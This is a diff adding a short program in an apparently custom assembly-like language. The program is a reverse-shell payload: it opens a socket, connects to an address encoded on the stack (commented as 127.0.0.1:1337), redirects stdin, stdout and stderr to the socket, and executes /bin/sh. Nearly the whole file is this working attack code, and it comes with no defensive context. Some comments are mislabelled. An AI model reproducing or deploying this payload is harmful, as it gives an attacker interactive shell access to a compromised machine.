@@ -1,0 +1,68 @@
+init:
+    ECALL   main
+
+exit:
+    # mov $0x3C, %rax
+    ESET    SRAX    0x3C
+    
+    # mov $0x0, %rdi
+    ESET    SRDI    0x0
+    
+    SYSCALL
+
+main:
+
+    # sys_socket - open the socket and get file descriptor
+    ESET    SRAX    0x29   # 41 sys_socket
+    ESET    SRDI    0x2
+    ESET    SRSI    0x1
+    ESET    SRDX    0x0
+    SYSCALL
+
+    # sys_connect - connect to the socket
+    ESET    SRDI    SRAX
+    ESET    SRAX    0x2a   # 42 sys_connect
+    
+    # Get pointer to stack for sa_addr struct
+    ESET    SRSI    SRSP
+
+    # sa_addr struct as layed out in C program
+    # EPUSH   0x020005397f000001
+    EPUSH   0x1000007f39050002
+    EPUSH   0x5555468000005555 
+
+    ESET    SRDX     0x10
+    SYSCALL
+    POP
+    POP
+    CLR
+
+    # sys_dup2  - duplicate stdin for the file descriptor
+    ESET    SRAX    0x21    # 33 sys_dup2
+    ESET    SRSI    0x0
+    ESET    SRDX    0x0
+    SYSCALL
+
+    # sys_dup2  - duplicate stdout for the file descriptor
+    ESET    SRAX    0x21    # 33 sys_dup2
+    ESET    SRSI    0x1
+    SYSCALL
+
+    # sys_dup2  - duplicate stderr for the file descriptor
+    ESET    SRAX    0x21    # 33 sys_dup2
+    ESET    SRSI    0x2
+    SYSCALL
+
+    # sys_dup2  - duplicate stderr for the file descriptor
+    ESET    SRAX    0x3B    # 59 sys_execve
+    ESET    SRSI    0x0
+    ESET    SRDX    0x0
+
+    CLR
+    ESET    SRDI    SRSP
+    EPUSH   "/bin/sh"
+    SYSCALL
+    POP
+    POP
+
+    ECALL   exit
